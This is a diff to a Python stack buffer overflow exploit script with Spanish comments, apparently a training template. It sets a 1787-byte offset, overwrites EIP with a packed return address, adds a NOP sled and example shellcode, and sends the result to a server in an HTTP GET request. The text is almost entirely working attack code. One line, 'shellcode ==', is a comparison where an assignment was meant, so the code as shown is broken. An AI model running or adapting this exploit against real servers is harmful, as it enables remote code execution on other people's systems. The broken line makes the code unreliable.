@@ -10,13 +10,14 @@ OFFSET_EIP = 1787 # -> Cantidad de bytes para llegar al EIP (obtenido con la fun
 
 
 before_eip = b'A'*OFFSET_EIP
-eip= b'B'*4
-
-payload = before_eip + eip + b'C'*500
+eip= pack("<L", 0x752c3cda)
 
 badchars = (b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f") # esto es a modo de ejemplo, se deben agregar todos los badchars detectados
-
 shellcode == b"\xb8\x1d\x7e\x3f\x1e\xda\xd6\xd9\x74\x24\xf4\x5a\x31\xc9\xb1" # Shellcode de ejemplo
+
+nops = b'\x90' * 16  # NOP sled
+
+payload = before_eip + eip + nops + shellcode
 
 # -- Funciones ---
 def fuzzing():
@@ -66,7 +67,6 @@ def exploit():
     s.send(b"GET /" + payload + b" HTTP/1.1\r\n\r\n")
     s.recv(1024)                                            # esto es para recibir la respuesta del servidor
     s.close()
-
 
 
 if __name__ == '__main__':
